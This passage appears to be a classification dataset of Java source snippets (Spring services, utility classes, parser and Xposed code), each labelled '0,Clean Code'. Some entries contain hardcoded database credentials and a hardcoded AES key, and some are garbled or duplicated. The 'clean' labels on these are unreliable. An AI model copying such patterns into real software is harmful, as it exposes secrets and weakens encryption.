        result.add(ItemStack.of(material,amount));
      }
);
      return result;
    }
    @Override public void write(    @NotNull TagWritable writer,    @Nullable List<ItemStack> value){
      if (value == null) {
        writer.removeTag(internal);
        return;
      }
      writer.setTag(internal,ListBinaryTag.listBinaryTag(BinaryTagTypes.COMPOUND,value.stream().map(item -> (BinaryTag)CompoundBinaryTag.builder().putByte(""Count"",(byte)item.amount()).putByte(""Slot"",(byte)1).putString(""id"",item.material().name()).build()).toList()));
    }
  }
);
  @Override public @NotNull Collection<Tag<?>> getBlockEntityTags(){
    return List.of(ITEMS);
  }
  @Override public @NotNull NamespaceID getNamespaceId(){
    return NamespaceID.from(""minestom:test"");
  }
}
",0,Clean Code
"/** 
 * 绾﹀畾寮傚父
 */
public static class ERROR {
  /** 
 * 鏈煡閿欒
 */
  public static final int UNKNOWN=1000;
  /** 
 * 瑙ｆ瀽閿欒
 */
  public static final int PARSE_ERROR=UNKNOWN + 1;
  /** 
 * 缃戠粶閿欒
 */
  public static final int NETWORD_ERROR=PARSE_ERROR + 1;
  /** 
 * 鍗忚鍑洪敊
 */
  public static final int HTTP_ERROR=NETWORD_ERROR + 1;
  /** 
 * 璇佷功鍑洪敊
 */
  public static final int SSL_ERROR=HTTP_ERROR + 1;
  /** 
 * 杩炴帴瓒呮椂
 */
  public static final int TIMEOUT_ERROR=SSL_ERROR + 1;
  /** 
 * 璋冪敤閿欒
 */
  public static final int INVOKE_ERROR=TIMEOUT_ERROR + 1;
  /** 
 * 绫昏浆鎹㈤敊璇�
 */
  public static final int CAST_ERROR=INVOKE_ERROR + 1;
  /** 
 * 璇锋眰鍙栨秷
 */
  public static final int REQUEST_CANCEL=CAST_ERROR + 1;
  /** 
 * 鏈煡涓绘満閿欒
 */
  public static final int UNKNOWNHOST_ERROR=REQUEST_CANCEL + 1;
  /** 
 * 绌烘寚閽堥敊璇�
 */
  public static final int NULLPOINTER_EXCEPTION=UNKNOWNHOST_ERROR + 1;
}",0,Clean Code
"/** 
 * 基于 RabbitMQ 的  {@link WebSocketMessageSender} 实现类
 * @author 芋道源码
 */
@Slf4j public class RabbitMQWebSocketMessageSender extends AbstractWebSocketMessageSender {
  private final RabbitTemplate rabbitTemplate;
  private final TopicExchange topicExchange;
  public RabbitMQWebSocketMessageSender(  WebSocketSessionManager sessionManager,  RabbitTemplate rabbitTemplate,  TopicExchange topicExchange){
    super(sessionManager);
    this.rabbitTemplate=rabbitTemplate;
    this.topicExchange=topicExchange;
  }
  @Override public void send(  Integer userType,  Long userId,  String messageType,  String messageContent){
    sendRabbitMQMessage(null,userId,userType,messageType,messageContent);
  }
  @Override public void send(  Integer userType,  String messageType,  String messageContent){
    sendRabbitMQMessage(null,null,userType,messageType,messageContent);
  }
  @Override public void send(  String sessionId,  String messageType,  String messageContent){
    sendRabbitMQMessage(sessionId,null,null,messageType,messageContent);
  }
  /** 
 * 通过 RabbitMQ 广播消息
 * @param sessionId Session 编号
 * @param userId 用户编号
 * @param userType 用户类型
 * @param messageType 消息类型
 * @param messageContent 消息内容
 */
  private void sendRabbitMQMessage(  String sessionId,  Long userId,  Integer userType,  String messageType,  String messageContent){
    RabbitMQWebSocketMessage mqMessage=new RabbitMQWebSocketMessage().setSessionId(sessionId).setUserId(userId).setUserType(userType).setMessageType(messageType).setMessageContent(messageContent);
    rabbitTemplate.convertAndSend(topicExchange.getName(),null,mqMessage);
  }
}
",0,Clean Code
"public class DictReader extends Thread {
  private static final Logger log=LogManager.getLogger(DictFileReader.class);
  String filePath;
  private boolean stopflag;
  private BlockingQueue<String> pathDict;
  public DictReader(  String filePath,  BlockingQueue<String> pathDict){
    this.filePath=filePath;
    this.pathDict=pathDict;
  }
  public void stopThread(){
    stopflag=true;
  }
  @Override public void run(){
    DictFileReader readline=new DictFileReader(filePath);
    while (true) {
      try {
        if (stopflag) {
          break;
        }
        List<String> tmp=readline.next(10000,"""");
        if (tmp.size() == 0) {
          log.info(""read dict file: "" + filePath + "" done"");
          break;
        }
 else {
          for (          String item : tmp) {
            pathDict.put(item);
          }
        }
      }
 catch (      InterruptedException e) {
        e.printStackTrace();
      }
    }
  }
}
",0,Clean Code
"/** 
 * 邮件发送 Service 接口
 * @author wangjingyi
 * @since 2022-03-21
 */
public interface MailSendService {
  /** 
 * 发送单条邮件给管理后台的用户
 * @param mail 邮箱
 * @param userId 用户编码
 * @param templateCode 邮件模版编码
 * @param templateParams 邮件模版参数
 * @return 发送日志编号
 */
  Long sendSingleMailToAdmin(  String mail,  Long userId,  String templateCode,  Map<String,Object> templateParams);
  /** 
 * 发送单条邮件给用户 APP 的用户
 * @param mail 邮箱
 * @param userId 用户编码
 * @param templateCode 邮件模版编码
 * @param templateParams 邮件模版参数
 * @return 发送日志编号
 */
  Long sendSingleMailToMember(  String mail,  Long userId,  String templateCode,  Map<String,Object> templateParams);
  /** 
 * 发送单条邮件给用户
 * @param mail 邮箱
 * @param userId 用户编码
 * @param userType 用户类型
 * @param templateCode 邮件模版编码
 * @param templateParams 邮件模版参数
 * @return 发送日志编号
 */
  Long sendSingleMail(  String mail,  Long userId,  Integer userType,  String templateCode,  Map<String,Object> templateParams);
  /** 
 * 执行真正的邮件发送 注意，该方法仅仅提供给 MQ Consumer 使用
 * @param message 邮件
 */
  void doSendMail(  MailSendMessage message);
}
",0,Clean Code
"/** 
 * Link query service.
 * @author <a href=""http://88250.b3log.org"">Liang Ding</a>
 * @version 1.0.0.0, Aug 21, 2018
 * @since 3.3.0
 */
@Service public class LinkQueryService {
  /** 
 * Logger.
 */
  private static final Logger LOGGER=LogManager.getLogger(LinkQueryService.class);
  /** 
 * Link repository.
 */
  @Inject private LinkRepository linkRepository;
  /** 
 * Tag cache.
 */
  @Inject private TagCache tagCache;
  /** 
 * Get top links with the specified size.
 * @param size the specified size
 * @return links, returns an empty list if not found
 */
  public List<JSONObject> getTopLink(  final int size){
    final List<JSONObject> ret=new ArrayList<>();
    try {
      final List<JSONObject> links=linkRepository.select(""SELECT\n"" + ""\t*\n"" + ""FROM\n""+ ""\t`symphony_link`\n""+ ""WHERE\n""+ ""\tlinkPingErrCnt / linkPingCnt < 0.1\n""+ ""AND linkTitle != \""\""\n""+ ""AND linkAddr NOT LIKE \""%baidu.com%\"" \n""+ ""AND linkAddr NOT LIKE \""%weiyun.com%\""\n""+ ""ORDER BY\n""+ ""\tlinkClickCnt DESC\n""+ ""LIMIT ?"",size);
      ret.addAll(links);
    }
 catch (    final Exception e) {
      LOGGER.log(Level.ERROR,""Get top links failed"",e);
    }
    return ret;
  }
}
",0,Clean Code
"public class BytecodeMappingTracer {
  public static final BytecodeMappingTracer DUMMY=new BytecodeMappingTracer();
  private int currentSourceLine;
  private StructLineNumberTableAttribute lineNumberTable=null;
  private final Map<Integer,Integer> mapping=new HashMap<>();
  public BytecodeMappingTracer(){
  }
  public BytecodeMappingTracer(  int initial_source_line){
    currentSourceLine=initial_source_line;
  }
  public void incrementCurrentSourceLine(){
    currentSourceLine++;
  }
  public void incrementCurrentSourceLine(  int number_lines){
    currentSourceLine+=number_lines;
  }
  public void addMapping(  int bytecode_offset){
    Map827.putIfAbsent(mapping,bytecode_offset,currentSourceLine);
  }
  public void addMapping(  Set<Integer> bytecode_offsets){
    if (bytecode_offsets != null) {
      for (      Integer bytecode_offset : bytecode_offsets) {
        addMapping(bytecode_offset);
      }
    }
  }
  public void addTracer(  BytecodeMappingTracer tracer){
    if (tracer != null) {
      for (      Entry<Integer,Integer> entry : tracer.mapping.entrySet()) {
        Map827.putIfAbsent(mapping,entry.getKey(),entry.getValue());
      }
    }
  }
  public Map<Integer,Integer> getMapping(){
    return mapping;
  }
  public int getCurrentSourceLine(){
    return currentSourceLine;
  }
  public void setCurrentSourceLine(  int currentSourceLine){
    this.currentSourceLine=currentSourceLine;
  }
  public void setLineNumberTable(  StructLineNumberTableAttribute lineNumberTable){
    this.lineNumberTable=lineNumberTable;
  }
  private final Set<Integer> unmappedLines=new HashSet<>();
  public Set<Integer> getUnmappedLines(){
    return unmappedLines;
  }
  public Map<Integer,Integer> getOriginalLinesMapping(){
    if (lineNumberTable == null) {
      return Collections.emptyMap();
    }
    Map<Integer,Integer> res=new HashMap<>();
    int[] data=lineNumberTable.getRawData();
    for (int i=0; i < data.length; i+=2) {
      int originalOffset=data[i];
      int originalLine=data[i + 1];
      Integer newLine=mapping.get(originalOffset);
      if (newLine != null) {
        res.put(originalLine,newLine);
      }
 else {
        unmappedLines.add(originalLine);
      }
    }
    for (    Entry<Integer,Integer> entry : mapping.entrySet()) {
      int originalLine=lineNumberTable.findLineNumber(entry.getKey());
      if (originalLine > -1 && !res.containsKey(originalLine)) {
        res.put(originalLine,entry.getValue());
        unmappedLines.remove(originalLine);
      }
    }
    return res;
  }
}
",0,Clean Code
"public class SpringDocApp8Test extends AbstractSpringDocTest {
@SpringBootApplication static class SpringDocTestApp {
  }
}
@TestPropertySource(properties=""springdoc.enable-hateoas=false"") public class SpringDocApp8Test extends AbstractSpringDocTest {
  private final Map<ClassKey,Class<?>> springMixins=new HashMap<>();
  @Autowired ObjectMapperProvider objectMapperProvider;
  @BeforeEach void init() throws IllegalAccessException {
    SimpleMixInResolver _mixIns=(SimpleMixInResolver)FieldUtils.readDeclaredField(objectMapperProvider.jsonMapper(),""_mixIns"",true);
    Map<ClassKey,Class<?>> _localMixIns=(Map<ClassKey,Class<?>>)FieldUtils.readDeclaredField(_mixIns,""_localMixIns"",true);
    Iterator<Entry<ClassKey,Class<?>>> it=_localMixIns.entrySet().iterator();
    while (it.hasNext()) {
      Entry<ClassKey,Class<?>> entry=it.next();
      if (entry.getKey().toString().startsWith(""org.springframework"")) {
        springMixins.put(entry.getKey(),entry.getValue());
        it.remove();
      }
    }
  }
  @AfterEach void clean() throws IllegalAccessException {
    SimpleMixInResolver _mixIns=(SimpleMixInResolver)FieldUtils.readDeclaredField(objectMapperProvider.jsonMapper(),""_mixIns"",true);
    Map<ClassKey,Class<?>> _localMixIns=(Map<ClassKey,Class<?>>)FieldUtils.readDeclaredField(_mixIns,""_localMixIns"",true);
    _localMixIns.putAll(springMixins);
  }
@SpringBootApplication static class SpringDocTestApp {
  }
}
/** 
 * The type Spring doc app 8 test.
 */
class SpringDocApp8Test extends AbstractSpringDocTest {
  /** 
 * Test app.
 * @throws Exception the exception
 */
  @Test protected void testApp() throws Exception {
    mockMvc.perform(get(""/myapp"" + Constants.DEFAULT_API_DOCS_URL).contextPath(""/myapp"")).andExpect(status().isOk());
  }
  /** 
 * The type Spring doc test app.
 */
@SpringBootApplication static class SpringDocTestApp {
  }
}
public class SpringDocApp8Test extends AbstractSpringDocTest {
@SpringBootApplication static class SpringDocTestApp {
  }
}
@TestPropertySource(properties=""springdoc.show-login-endpoint=true"") public class SpringDocApp8Test extends AbstractSpringDocTest {
@SpringBootApplication(scanBasePackages={""test.org.springdoc.api.v31.configuration"",""test.org.springdoc.api.v31.app8""}) static class SpringDocTestApp {
    @Bean public OpenAPI customOpenAPI(){
      return new OpenAPI().info(new Info().title(""Security API"").version(""v1"").license(new License().name(""Apache 2.0"").url(""http://springdoc.org"")));
    }
  }
}
",0,Clean Code
"/** 
 * @author <a href=""mailto:wangchao.star@gmail.com"">wangchao</a>
 * @version 1.0.0
 * @since 2019-11-10 17:35:00
 */
public class ClassSettingsConfigurable extends AbstractTemplateConfigurable<ClassSettingsView> {
  private EasyDocConfig config=ServiceManager.getService(EasyDocConfigComponent.class).getState();
  private ClassSettingsView view=new ClassSettingsView(config);
  @Nls(capitalization=Capitalization.Title) @Override public String getDisplayName(){
    return ""EasyDocClassTemplate"";
  }
  @Override public ClassSettingsView getView(){
    return view;
  }
  @Override public boolean isModified(){
    TemplateConfig templateConfig=config.getClassTemplateConfig();
    if (!Objects.equals(templateConfig.getIsDefault(),view.isDefault())) {
      return true;
    }
    if (!Objects.equals(templateConfig.getTemplate(),view.getTemplate())) {
      return true;
    }
    return false;
  }
  @Override public void apply() throws ConfigurationException {
    TemplateConfig templateConfig=config.getClassTemplateConfig();
    templateConfig.setIsDefault(view.isDefault());
    templateConfig.setTemplate(view.getTemplate());
    if (templateConfig.getCustomMap() == null) {
      templateConfig.setCustomMap(new TreeMap<>());
    }
    if (!view.isDefault()) {
      if (StringUtils.isBlank(view.getTemplate())) {
        throw new ConfigurationException(""使用自定义模板，模板不能为空"");
      }
      String temp=StringUtils.strip(view.getTemplate());
      if (!temp.startsWith(""/**"") || !temp.endsWith(""*/"")) {
        throw new ConfigurationException(""模板格式不正确，正确的javadoc应该以\""/**\""开头，以\""*/\""结束"");
      }
    }
  }
  @Override public void reset(){
    TemplateConfig templateConfig=config.getClassTemplateConfig();
    if (BooleanUtils.isTrue(templateConfig.getIsDefault())) {
      view.setDefault(true);
    }
 else {
      view.setDefault(false);
    }
    view.setTemplate(templateConfig.getTemplate());
  }
}",0,Clean Code
"/** 
 * @version v2.3
 * @ClassName :CpuStateService.java
 * @author : http://www.wgstart.com
 * @date : 2019年11月16日
 * @Description : CpuStateService.java
 * @Copyright : 2017-2024 wgcloud. All rights reserved.
 */
@Service public class CpuStateService {
  @Autowired private CpuStateMapper cpuStateMapper;
  public PageInfo selectByParams(  Map<String,Object> params,  int currPage,  int pageSize) throws Exception {
    PageHelper.startPage(currPage,pageSize);
    List<CpuState> list=cpuStateMapper.selectByParams(params);
    PageInfo<CpuState> pageInfo=new PageInfo<CpuState>(list);
    return pageInfo;
  }
  public void save(  CpuState CpuState) throws Exception {
    CpuState.setId(UUIDUtil.getUUID());
    CpuState.setCreateTime(DateUtil.getNowTime());
    CpuState.setDateStr(DateUtil.getDateTimeString(CpuState.getCreateTime()));
    cpuStateMapper.save(CpuState);
  }
  public void saveRecord(  List<CpuState> recordList) throws Exception {
    if (recordList.size() < 1) {
      return;
    }
    for (    CpuState as : recordList) {
      as.setId(UUIDUtil.getUUID());
      as.setDateStr(DateUtil.getDateTimeString(as.getCreateTime()));
    }
    cpuStateMapper.insertList(recordList);
  }
  public int deleteById(  String[] id) throws Exception {
    return cpuStateMapper.deleteById(id);
  }
  public CpuState selectById(  String id) throws Exception {
    return cpuStateMapper.selectById(id);
  }
  public List<CpuState> selectAllByParams(  Map<String,Object> params) throws Exception {
    return cpuStateMapper.selectAllByParams(params);
  }
}
",0,Clean Code
"public class SoundMessageContent extends MediaMessageContent {
  private int duration;
  public SoundMessageContent(){
  }
  public SoundMessageContent(  int duration){
    this.duration=duration;
  }
  public int getDuration(){
    return duration;
  }
  public void setDuration(  int duration){
    this.duration=duration;
  }
  @Override public int getContentType(){
    return ProtoConstants.ContentType.Voice;
  }
  @Override public int getPersistFlag(){
    return ProtoConstants.PersistFlag.Persist_And_Count;
  }
  @Override public void decode(  MessagePayload payload){
    super.decode(payload);
  }
  @Override public MessagePayload encode(){
    MessagePayload payload=super.encode();
    JSONObject jsonObject=new JSONObject();
    jsonObject.put(""duration"",duration);
    payload.setContent(jsonObject.toJSONString());
    return payload;
  }
  @Override protected int getMediaType(){
    return ProtoConstants.MessageMediaType.VOICE;
  }
}
",0,Clean Code
"/** 
 * 统一关于错误配置信息 异常
 * @author AllDataDC
 * @date 2023-01-27 18:06
 */
public class BadConfigurationException extends RuntimeException {
  /** 
 * Constructs a new runtime exception with  {@code null} as itsdetail message.  The cause is not initialized, and may subsequently be initialized by a call to  {@link #initCause}.
 */
  public BadConfigurationException(){
    super();
  }
  /** 
 * Constructs a new runtime exception with the specified detail message. The cause is not initialized, and may subsequently be initialized by a call to  {@link #initCause}.
 * @param message the detail message. The detail message is saved forlater retrieval by the  {@link #getMessage()} method.
 */
  public BadConfigurationException(  String message){
    super(message);
  }
  /** 
 * Constructs a new runtime exception with the specified detail message and cause.  <p>Note that the detail message associated with {@code cause} is <i>not</i> automatically incorporated inthis runtime exception's detail message.
 * @param message the detail message (which is saved for later retrievalby the  {@link #getMessage()} method).
 * @param cause   the cause (which is saved for later retrieval by the{@link #getCause()} method).  (A {@code null} value ispermitted, and indicates that the cause is nonexistent or unknown.)
 * @since 1.4
 */
  public BadConfigurationException(  String message,  Throwable cause){
    super(message,cause);
  }
  /** 
 * Constructs a new runtime exception with the specified cause and a detail message of  {@code (cause==null ? null : cause.toString())}(which typically contains the class and detail message of {@code cause}).  This constructor is useful for runtime exceptions that are little more than wrappers for other throwables.
 * @param cause the cause (which is saved for later retrieval by the{@link #getCause()} method).  (A {@code null} value ispermitted, and indicates that the cause is nonexistent or unknown.)
 * @since 1.4
 */
  public BadConfigurationException(  Throwable cause){
    super(cause);
  }
  /** 
 * Constructs a new runtime exception with the specified detail message, cause, suppression enabled or disabled, and writable stack trace enabled or disabled.
 * @param message            the detail message.
 * @param cause              the cause.  (A {@code null} value is permitted,and indicates that the cause is nonexistent or unknown.)
 * @param enableSuppression  whether or not suppression is enabledor disabled
 * @param writableStackTrace whether or not the stack trace shouldbe writable
 * @since 1.7
 */
  protected BadConfigurationException(  String message,  Throwable cause,  boolean enableSuppression,  boolean writableStackTrace){
    super(message,cause,enableSuppression,writableStackTrace);
  }
}",0,Clean Code
"public static class ExprContext extends ParserRuleContext {
  public TerminalNode T_OPEN_P(){
    return getToken(HiveSqlParser.T_OPEN_P,0);
  }
  public Select_stmtContext select_stmt(){
    return getRuleContext(Select_stmtContext.class,0);
  }
  public TerminalNode T_CLOSE_P(){
    return getToken(HiveSqlParser.T_CLOSE_P,0);
  }
  public List<ExprContext> expr(){
    return getRuleContexts(ExprContext.class);
  }
  public ExprContext expr(  int i){
    return getRuleContext(ExprContext.class,i);
  }
  public Expr_intervalContext expr_interval(){
    return getRuleContext(Expr_intervalContext.class,0);
  }
  public Expr_concatContext expr_concat(){
    return getRuleContext(Expr_concatContext.class,0);
  }
  public Expr_caseContext expr_case(){
    return getRuleContext(Expr_caseContext.class,0);
  }
  public Expr_cursor_attributeContext expr_cursor_attribute(){
    return getRuleContext(Expr_cursor_attributeContext.class,0);
  }
  public Expr_agg_window_funcContext expr_agg_window_func(){
    return getRuleContext(Expr_agg_window_funcContext.class,0);
  }
  public Expr_spec_funcContext expr_spec_func(){
    return getRuleContext(Expr_spec_funcContext.class,0);
  }
  public Expr_funcContext expr_func(){
    return getRuleContext(Expr_funcContext.class,0);
  }
  public Expr_atomContext expr_atom(){
    return getRuleContext(Expr_atomContext.class,0);
  }
  public TerminalNode T_MUL(){
    return getToken(HiveSqlParser.T_MUL,0);
  }
  public TerminalNode T_DIV(){
    return getToken(HiveSqlParser.T_DIV,0);
  }
  public TerminalNode T_ADD(){
    return getToken(HiveSqlParser.T_ADD,0);
  }
  public TerminalNode T_SUB(){
    return getToken(HiveSqlParser.T_SUB,0);
  }
  public Interval_itemContext interval_item(){
    return getRuleContext(Interval_itemContext.class,0);
  }
  public ExprContext(  ParserRuleContext parent,  int invokingState){
    super(parent,invokingState);
  }
  @Override public int getRuleIndex(){
    return RULE_expr;
  }
  @Override public void enterRule(  ParseTreeListener listener){
    if (listener instanceof HiveSqlListener)     ((HiveSqlListener)listener).enterExpr(this);
  }
  @Override public void exitRule(  ParseTreeListener listener){
    if (listener instanceof HiveSqlListener)     ((HiveSqlListener)listener).exitExpr(this);
  }
  @Override public <T>T accept(  ParseTreeVisitor<? extends T> visitor){
    if (visitor instanceof HiveSqlVisitor)     return ((HiveSqlVisitor<? extends T>)visitor).visitExpr(this);
 else     return visitor.visitChildren(this);
  }
}",0,Clean Code
"/** 
 * Desc: Created by zhisheng on 2019/10/17 下午4:47 blog：http://www.54tianzhisheng.cn/ 微信公众号：zhisheng
 */
@Slf4j public class GetAlertRuleSourceFunction extends RichSourceFunction<List<AlertRule>> {
  private PreparedStatement ps;
  private Connection connection;
  private volatile boolean isRunning=true;
  private ParameterTool parameterTool;
  @Override public void open(  Configuration parameters) throws Exception {
    parameterTool=(ParameterTool)getRuntimeContext().getExecutionConfig().getGlobalJobParameters();
    connection=getConnection();
    String sql=""select * from alert_rule;"";
    if (connection != null) {
      ps=this.connection.prepareStatement(sql);
    }
  }
  @Override public void run(  SourceContext<List<AlertRule>> ctx) throws Exception {
    List<AlertRule> list=new ArrayList<>();
    while (isRunning) {
      ResultSet resultSet=ps.executeQuery();
      while (resultSet.next()) {
        AlertRule alertRule=new AlertRule().builder().id(resultSet.getInt(""id"")).name(resultSet.getString(""name"")).measurement(resultSet.getString(""measurement"")).thresholds(resultSet.getString(""thresholds"")).build();
        list.add(alertRule);
      }
      log.info(""=======select alarm notify from mysql, size = {}, map = {}"",list.size(),list);
      ctx.collect(list);
      list.clear();
      Thread.sleep(1000 * 60);
    }
  }
  @Override public void cancel(){
    try {
      super.close();
      if (connection != null) {
        connection.close();
      }
      if (ps != null) {
        ps.close();
      }
    }
 catch (    Exception e) {
      log.error(""runException:{}"",e);
    }
    isRunning=false;
  }
  private static Connection getConnection(){
    Connection con=null;
    try {
      Class.forName(""com.mysql.jdbc.Driver"");
      con=DriverManager.getConnection(""jdbc:mysql://localhost:3306/test?useUnicode=true&characterEncoding=UTF-8"",""root"",""root123456"");
    }
 catch (    Exception e) {
      log.error(""-----------mysql get connection has exception , msg = {}"",e.getMessage());
    }
    return con;
  }
}
",0,Clean Code
"/** 
 * @author xiongxiaoyang
 * @date 2022/5/17
 */
@UtilityClass public class IpUtils {
  private static final String UNKNOWN_IP=""unknown"";
  private static final String IP_SEPARATOR="","";
  /** 
 * 获取真实IP
 * @return 真实IP
 */
  public String getRealIp(  HttpServletRequest request){
    String ip=request.getHeader(""X-Real-IP"");
    if (ip == null || ip.length() == 0 || UNKNOWN_IP.equalsIgnoreCase(ip)) {
      ip=request.getHeader(""X-Forwarded-For"");
    }
    if (ip == null || ip.length() == 0 || UNKNOWN_IP.equalsIgnoreCase(ip)) {
      ip=request.getHeader(""Proxy-Client-IP"");
    }
    if (ip == null || ip.length() == 0 || UNKNOWN_IP.equalsIgnoreCase(ip)) {
      ip=request.getHeader(""WL-Proxy-Client-IP"");
    }
    if (ip == null || ip.length() == 0 || UNKNOWN_IP.equalsIgnoreCase(ip)) {
      ip=request.getRemoteAddr();
    }
    if (ip != null && ip.contains(IP_SEPARATOR)) {
      String[] ipArray=ip.split(IP_SEPARATOR);
      ip=ipArray[0];
    }
    return ip;
  }
}
",0,Clean Code
"public class EncryptUtils {
  private static final String HEX=""0123456789ABCDEF"";
  private static final byte[] KV=new byte[]{'c','o','d','i','n','g','a','f','f','a','i','r','s','c','o','m'};
  public static String encrypt(  String cleartext) throws Exception {
    byte[] rawKey=getRawKey();
    byte[] result=encrypt(rawKey,cleartext.getBytes());
    return toHex(result);
  }
  public static String decrypt(  String encrypted) throws Exception {
    byte[] enc=toByte(encrypted);
    byte[] result=decrypt(enc);
    return new String(result);
  }
  private static byte[] getRawKey() throws Exception {
    SecretKey key=new SecretKeySpec(KV,""AES"");
    return key.getEncoded();
  }
  private static byte[] encrypt(  byte[] raw,  byte[] clear) throws Exception {
    SecretKey skeySpec=new SecretKeySpec(raw,""AES"");
    Cipher cipher=Cipher.getInstance(""AES"");
    cipher.init(Cipher.ENCRYPT_MODE,skeySpec);
    return cipher.doFinal(clear);
  }
  private static byte[] decrypt(  byte[] encrypted) throws Exception {
    SecretKey skeySpec=new SecretKeySpec(KV,""AES"");
    Cipher cipher=Cipher.getInstance(""AES"");
    cipher.init(Cipher.DECRYPT_MODE,skeySpec);
    return cipher.doFinal(encrypted);
  }
  public static byte[] toByte(  String hexString){
    int len=hexString.length() / 2;
    byte[] result=new byte[len];
    for (int i=0; i < len; i++) {
      result[i]=Integer.valueOf(hexString.substring(2 * i,2 * i + 2),16).byteValue();
    }
    return result;
  }
  public static String toHex(  byte[] buf){
    if (buf == null) {
      return """";
    }
    StringBuffer result=new StringBuffer(2 * buf.length);
    for (    byte b : buf) {
      appendHex(result,b);
    }
    return result.toString();
  }
  private static void appendHex(  StringBuffer sb,  byte b){
    sb.append(HEX.charAt((b >> 4) & 0x0f)).append(HEX.charAt(b & 0x0f));
  }
}
",0,Clean Code
"public class CameraIconStateHolder extends StateHolder {
  private String mUserId="""";
  private LiveData<CameraIconUiState> mCameraIconData=new LiveData<>(new CameraIconUiState());
  private CameraIconUiState mCameraIconUiState=new CameraIconUiState();
  private boolean mIsSeatEnable=mRoomState.isSeatEnabled.get();
  private List<String> mSeatedUsers=mSeatState.seatedUsers.getList();
  private List<String> mHasCameraStreamUsers=mUserState.hasCameraStreamUsers.getList();
  private Observer<Boolean> mSeatEnableObserver=new Observer<Boolean>(){
    @Override public void onChanged(    Boolean isSeatEnable){
      mIsSeatEnable=isSeatEnable;
      updateViewData();
    }
  }
;
  private LiveListObserver<String> mSeatObserver=new LiveListObserver<String>(){
    @Override public void onDataChanged(    List<String> list){
      updateViewData();
    }
    @Override public void onItemInserted(    int position,    String item){
      updateViewData();
    }
    @Override public void onItemRemoved(    int position,    String item){
      updateViewData();
    }
  }
;
  private LiveListObserver<String> mCameraStreamObserver=new LiveListObserver<String>(){
    @Override public void onItemInserted(    int position,    String item){
      if (!TextUtils.equals(item,mUserId)) {
        return;
      }
      updateViewData();
    }
    @Override public void onItemRemoved(    int position,    String item){
      if (!TextUtils.equals(item,mUserId)) {
        return;
      }
      updateViewData();
    }
  }
;
  public void setUserId(  String userId){
    mUserId=userId;
    updateViewData();
  }
  public void observe(  Observer<CameraIconUiState> observer){
    mCameraIconData.observe(observer);
    mRoomState.isSeatEnabled.observe(mSeatEnableObserver);
    mSeatState.seatedUsers.observe(mSeatObserver);
    mUserState.hasCameraStreamUsers.observe(mCameraStreamObserver);
  }
  public void removeObserver(  Observer<CameraIconUiState> observer){
    mCameraIconData.removeObserver(observer);
    mRoomState.isSeatEnabled.removeObserver(mSeatEnableObserver);
    mSeatState.seatedUsers.removeObserver(mSeatObserver);
    mUserState.hasCameraStreamUsers.removeObserver(mCameraStreamObserver);
  }
  public void updateViewData(){
    mCameraIconUiState.hasCameraStream=mHasCameraStreamUsers.contains(mUserId);
    mCameraIconUiState.isShow=isShowView();
    mCameraIconData.set(mCameraIconUiState);
  }
  private boolean isShowView(){
    if (ViewState.UserListType.ALL_USER_ENTERED_THE_ROOM.equals(mViewState.userListType.get())) {
      return true;
    }
    return ViewState.UserListType.ON_SEAT_INSIDE_THE_ROOM.equals(mViewState.userListType.get()) && mSeatedUsers.contains(mUserId);
  }
}
",0,Clean Code
"/** 
 * Base class for Xposed callback parameters.
 */
public static abstract class Param {
  /** 
 * @hide 
 */
  public final Object[] callbacks;
  private Bundle extra;
  /** 
 * @deprecated This constructor can't be hidden for technical reasons. Nevertheless, don't use it! 
 */
  @Deprecated protected Param(){
    callbacks=null;
  }
  /** 
 * @hide 
 */
  protected Param(  CopyOnWriteSortedSet<? extends XCallback> callbacks){
    this.callbacks=callbacks.getSnapshot();
  }
  /** 
 * This can be used to store any data for the scope of the callback. <p>Use this instead of instance variables, as it has a clear reference to e.g. each separate call to a method, even when the same method is called recursively.
 * @see #setObjectExtra
 * @see #getObjectExtra
 */
  public synchronized Bundle getExtra(){
    if (extra == null)     extra=new Bundle();
    return extra;
  }
  /** 
 * Returns an object stored with  {@link #setObjectExtra}.
 */
  public Object getObjectExtra(  String key){
    Serializable o=getExtra().getSerializable(key);
    if (o instanceof SerializeWrapper)     return ((SerializeWrapper)o).object;
    return null;
  }
  /** 
 * Stores any object for the scope of the callback. For data types that support it, use the  {@link Bundle} returned by {@link #getExtra} instead.
 */
  public void setObjectExtra(  String key,  Object o){
    getExtra().putSerializable(key,new SerializeWrapper(o));
  }
private static class SerializeWrapper implements Serializable {
    private static final long serialVersionUID=1L;
    private final Object object;
    public SerializeWrapper(    Object o){
      object=o;
    }
  }
}
/** 
 * Base class for Xposed callback parameters.
 */
public static abstract class Param {
  /** 
 * @hide 
 */
  public final Object[] callbacks;
  private Bundle extra;
  /** 
 * @deprecated This constructor can't be hidden for technical reasons. Nevertheless, don't use it! 
 */
  @Deprecated protected Param(){
    callbacks=null;
  }
  /** 
 * @hide 
 */
  protected Param(  CopyOnWriteSortedSet<? extends XCallback> callbacks){
    this.callbacks=callbacks.getSnapshot();
  }
  /** 
 * This can be used to store any data for the scope of the callback. <p>Use this instead of instance variables, as it has a clear reference to e.g. each separate call to a method, even when the same method is called recursively.
 * @see #setObjectExtra
 * @see #getObjectExtra
 */
  public synchronized Bundle getExtra(){
    if (extra == null)     extra=new Bundle();
    return extra;
  }
  /** 
 * Returns an object stored with  {@link #setObjectExtra}.
 */
  public Object getObjectExtra(  String key){
    Serializable o=getExtra().getSerializable(key);
    if (o instanceof SerializeWrapper)     return ((SerializeWrapper)o).object;
    return null;
  }
  /** 
 * Stores any object for the scope of the callback. For data types that support it, use the  {@link Bundle} returned by {@link #getExtra} instead.
 */
  public void setObjectExtra(  String key,  Object o){
    getExtra().putSerializable(key,new SerializeWrapper(o));
  }
private static class SerializeWrapper implements Serializable {
    private static final long serialVersionUID=1L;
    private final Object object;
    public SerializeWrapper(    Object o){
      object=o;
    }
  }
}
",0,Clean Code
"public interface ContextService {
  /** 
 * 创建ContextID，返回ContextID序列化后的字符串
 * @param flow
 * @param user
 * @param version
 * @return
 */
  String createContextID(  String workspace,  String projectName,  String flow,  String version,  String user);
  /** 
 * 检查和创建ContextID，返回创建ID后的jsonFlow 检查ContextID信息：如果jsonFlow不包含ContextID信息，则创建新的； 如果已经有ContextID，判断传入flowVersion是否相同，不同则创建新的ContextID，并返回新创建的ContextID序列化内容；相同则不创建新ID; 新创建的ContextID会更新到flowJson里
 * @param jsonFlow
 * @param flowVersion
 * @param workspace
 * @param project
 * @param flow
 * @param user
 * @param fullCheck - true 检查所有参数； false 只检查jsonFlow中ContextID是否存在，存在则不再比较ContextID中version参数等是否相同，且不创建
 * @return
 */
